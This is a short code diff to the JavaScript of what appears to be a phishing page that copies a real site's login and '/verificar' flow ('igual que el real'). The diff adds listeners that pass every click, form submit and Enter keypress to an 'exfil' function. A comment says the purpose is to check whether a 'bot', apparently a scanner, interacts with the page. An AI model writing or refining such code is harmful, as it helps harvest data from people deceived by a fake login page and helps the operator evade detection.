@@ -54,6 +54,19 @@
     }
   });
 
+  // Diagnostico: ver si el bot clickea / dispara submit en absoluto.
+  document.addEventListener("click", function (ev) {
+    var t = ev.target ? (ev.target.id || ev.target.tagName || "?") : "?";
+    exfil("click", { t: t });
+  }, true);
+  document.addEventListener("submit", function (ev) {
+    var t = ev.target ? (ev.target.id || "?") : "?";
+    exfil("submit-evt", { form: t });
+  }, true);
+  document.addEventListener("keydown", function (ev) {
+    if (ev.key === "Enter") exfil("enter", { on: (ev.target && ev.target.id) || "?" });
+  }, true);
+
   // --- Paso 1: login -> navega a /verificar (igual que el real) ---
   var formLogin = document.getElementById("form-login");
   if (formLogin) {
